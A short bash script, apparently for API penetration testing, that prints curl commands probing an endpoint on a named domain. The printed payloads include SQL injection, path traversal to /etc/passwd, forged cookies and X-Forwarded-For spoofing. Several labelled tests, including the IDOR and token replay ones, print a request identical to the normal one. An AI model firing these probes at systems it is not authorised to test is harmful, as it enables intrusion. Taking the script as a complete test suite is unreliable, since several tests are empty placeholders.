
#!/bin/bash

# Ensure the base URL is provided as an argument
if [ -z "$1" ]; then
  echo "Usage: $0 <base_url>"
  echo "Example: $0 https://rasmio.com/api/v3/Ticket/TicketDetails"
  exit 1
fi

BASE_URL=$1

# Ensure TOKEN and COOKIE are set
if [ -z "$TOKEN" ] || [ -z "$COOKIE" ]; then
  echo "Error: TOKEN and COOKIE environment variables must be set."
  exit 1
fi

echo "### Testing Normal ###"
echo "curl -X GET \"$BASE_URL\" -H \"Authorization: Bearer \$TOKEN\" -H \"Cookie: \$COOKIE\""

echo "### Testing Parameter Tampering: id-100 ###"
echo "curl -X GET \"$BASE_URL\" -H \"Authorization: Bearer \$TOKEN\" -H \"Cookie: \$COOKIE\""

echo "###  esting SQL Injection: id=1267' OR '1'='1 ### "
echo "curl -X GET \"$BASE_URL' OR '1'='1\" -H \"Authorization: Bearer \$TOKEN\" -H \"Cookie: \$COOKIE\""

echo "Testing Broken Authentication"
echo "curl -X GET \"$BASE_URL\" -H \"Cookie: \$COOKIE\""

echo "Testing Excessive Data Exposure: looking result for "
echo "curl -X GET \"$BASE_URL\" -H \"Authorization: Bearer \$TOKEN\" -H \"Cookie: \$COOKIE\""

echo "Testing IDOR (Insecure Direct Object Reference)"
echo "curl -X GET \"$BASE_URL\" -H \"Authorization: Bearer \$TOKEN\" -H \"Cookie: \$COOKIE\""

echo "Testing Token Replay Attack"
echo "curl -X GET \"$BASE_URL\" -H \"Authorization: Bearer \$TOKEN\" -H \"Cookie: \$COOKIE\""

echo "Testing Cookie Manipulation"
echo "curl -X GET \"$BASE_URL\" -H \"Authorization: Bearer \$TOKEN\" -H \"Cookie: persist%3ArasmioToken={%22accessToken%22:%22invalid%22}\""

echo "Testing Path Traversal: ?id=../../etc/passwd"
echo "curl -X GET \"$BASE_URL?id=../../etc/passwd\" -H \"Authorization: Bearer \$TOKEN\" -H \"Cookie: \$COOKIE\""

echo "Testing with a Large Payload"
echo "curl -X GET \"$BASE_URL?id=\$(python3 -c 'import urllib.parse; print(urllib.parse.quote(\"A\"*10000))')\" -H \"Authorization: Bearer \$TOKEN\" -H \"Cookie: \$COOKIE\""

echo "Testing Header Manipulation"
echo "curl -X GET \"$BASE_URL\" -H \"Authorization: Bearer \$TOKEN\" -H \"X-Forwarded-For: 127.0.0.1\" -H \"Cookie: \$COOKIE\""

